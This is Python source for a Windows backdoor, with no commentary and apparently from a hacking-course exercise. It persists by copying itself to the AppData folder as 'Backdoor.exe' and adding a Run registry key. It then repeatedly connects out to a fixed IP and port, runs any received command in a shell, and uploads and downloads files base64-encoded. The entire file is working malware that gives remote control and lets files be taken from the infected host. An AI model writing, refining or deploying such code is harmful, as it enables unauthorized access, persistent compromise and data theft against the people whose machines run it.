#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())


def reliable_recv():    
    json_data = ''
    while True:
        try :
            json_data = json_data + sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(('192.168.1.110', 15555))
            shell()
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == 'download':
            try:
                with open(command[9:], 'rb') as file:
                    reliable_send(base64.b64encode(file.read()).decode())
            except:
                reliable_send(base64.b64encode(b'Failed to read file'))
        elif command[:6] == 'upload':
            with open(command[7:], 'wb') as fin:
                result = reliable_recv()
                fin.write(base64.b64decode(result))
            continue
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = (proc.stdout.read() + proc.stderr.read()).decode()
                reliable_send(result)
            except:
                reliable_send("[!!] Can't Execute the Command")

location = os.environ['appdata'] + '\\Backdoor.exe'
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
sock.close()
